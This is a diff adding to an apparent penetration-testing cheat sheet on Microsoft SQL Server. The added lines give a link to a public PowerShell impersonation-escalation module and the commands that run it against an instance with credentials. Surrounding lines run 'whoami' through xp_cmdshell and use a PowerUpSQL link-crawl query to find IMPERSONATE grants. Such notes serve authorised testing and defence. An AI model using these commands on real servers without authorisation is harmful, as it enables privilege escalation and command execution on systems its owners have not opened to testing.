@@ -1391,7 +1391,14 @@ GO
 -- Quickly check what the service account is via xp_cmdshell
 EXEC master..xp_cmdshell 'whoami'
 ```
-
+ 
+#### Impersonate exploit script
+- https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
+```
+Import-Module .\Invoke-SqlServer-Escalate-ExecuteAs.psm1
+Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance <INSTANCE> -SqlUser <USER> -SqlPass <PASSWORD>
+```
+ 
 #### Check for impersonation through link
 ```
 Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
